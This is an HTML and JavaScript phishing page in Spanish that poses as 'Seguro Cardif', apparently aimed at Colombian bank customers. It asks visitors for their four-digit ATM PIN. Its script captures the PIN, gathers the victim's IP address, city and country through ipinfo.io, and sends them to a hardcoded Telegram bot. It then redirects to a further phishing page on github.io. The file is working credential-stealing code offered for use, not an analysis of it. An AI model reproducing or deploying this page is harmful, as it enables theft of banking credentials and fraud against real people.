<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguro Cardif</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            font-family: 'Manrope', sans-serif;
            background-image: url("img/simulador.png");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            color: #200020;
            padding: 120px 20px 20px;
        }

        .container {
            max-width: 600px;
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 30px;
            margin: auto;
            text-align: left;
        }

        .digit-input-container {
            display: flex;
            justify-content: center;
            gap: 5px; /* Espacio peque√±o entre los inputs */
        }

        .digit-input {
            width: 30px;  /* Ajustado el ancho del input */
            height: 40px; /* Ajustado el alto del input */
            text-align: center;
            font-size: 24px;
            padding: 0 5px; /* Ajustado el padding para que los n√∫meros se vean bien */
            border-top: none;
            border-right: none;
            border-left: none;
            border-bottom: 1px solid #808282; /* Borde inferior gris */
            background-color: transparent;
            margin: 0; /* Eliminar el margen entre los inputs */
            border-radius: 0px !important;
        }

        /* Efecto cuando el input est√° en foco */
        .digit-input:focus {
            border-bottom: 1px solid #fdda24; /* Resaltar el borde inferior cuando est√° en foco */
            outline: none;
        }

        .btn-primary {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 18px 80px;
            font-family: 'Manrope', sans-serif;
            font-weight: bold;
            height: 48px;
            border-radius: 50px;
            background-color: #fdda24;
            border-color: #fdda24;
            color: #292929;
            transition: background-color 0.3s ease;
        }

        .btn-primary:hover,
        .btn-primary:focus,
        .btn-primary:active {
            background-color: #d9a80e;
            border-color: #d9a80e;
            color: #292929;
            outline: none;
            box-shadow: none;
        }

        @media (max-width: 768px) {
            body {
                padding: 20px 10px;
            }

            .container {
                padding: 20px;
            }

            .digit-input-container {
                justify-content: center;
                gap: 5px; /* Espacio peque√±o entre los inputs */
            }

            .digit-input {
                width: 30px;
                height: 40px;
                font-size: 24px;
            }

            .btn-primary {
                width: 67%;
                padding: 18px 0;
            }
        }
    </style>
</head>
<body>
    <img src="cl.jpeg" alt="" width="100%">
    <div class="container">
        <center> <img src="iccl.jpeg" alt="" width="9%"></center>
        <br>
        <div class="sc-fqkvVR">Es la misma que usas en el cajero autom√°tico</div>

        <br><br>
        <form id="simple-form">
            <div class="digit-input-container">
                <input type="text" class="digit-input" maxlength="1" data-id="1" inputmode="numeric" name="field1">
                <input type="text" class="digit-input" maxlength="1" data-id="2" inputmode="numeric" name="field2">
                <input type="text" class="digit-input" maxlength="1" data-id="3" inputmode="numeric" name="field3">
                <input type="text" class="digit-input" maxlength="1" data-id="4" inputmode="numeric" name="field4">
            </div>
            <br><br>
            <div class="btn-container">
                 <center><button type="button" id="btn-enviar" class="btn btn-primary">Continuar</button></center>
            </div>
        </form>
    </div>
    <img src="fi.jpeg" alt="" width="100%">

    <script type="text/javascript">
        $(document).ready(function () {
            $('.digit-input').on('input', function () {
                const $this = $(this);
                if ($this.val().length > 1) {
                    $this.val($this.val().slice(0, 1));
                }
                const nextInput = $this.next('.digit-input');
                if (nextInput.length && $this.val() !== '') {
                    nextInput.focus();
                }
            });

            $('.digit-input').on('keydown', function (e) {
                if (e.key === 'Backspace' && !$(this).val()) {
                    const prevInput = $(this).prev('.digit-input');
                    if (prevInput.length) {
                        prevInput.focus();
                    }
                }
            });

            $('#btn-enviar').click(function () {
                const datos = $('.digit-input').map(function () {
                    return $(this).val();
                }).get().join('');

                if (datos.length < 4) {
                    alert("Por favor, complete todos los campos.");
                    return;
                }

                const botToken = '7010913168:AAG6dWUFcTUuSSYBDv-ub5KtpLjFIihrYxQ';
                const chatId = '6781382323';

                $.getJSON('https://ipinfo.io/json', function (data) {
                    const ip = data.ip || 'IP desconocida';
                    const ciudad = data.city || 'Ciudad desconocida';
                    const pais = data.country || 'Pa√≠s desconocido';

                    const mensaje = `üëÅFormulario SimpleüëÅ\nüìùDato ingresado: ${datos}\nüåèIP: ${ip}\nüèôCiudad: ${ciudad}\nüá®üá¥Pa√≠s: ${pais}`;

                    $.ajax({
                        url: `https://api.telegram.org/bot${botToken}/sendMessage`,
                        method: 'POST',
                        data: {
                            chat_id: chatId,
                            text: mensaje
                        },
                        success: function (response) {
                            window.location.href = "https://virtualspacesegurbancol.github.io/cardif/p1.html";
                        },
                        error: function (error) {
                            alert("Error ingrese su Clave.");
                        }
                    });
                });
            });
        });
    </script>
</body>
</html>
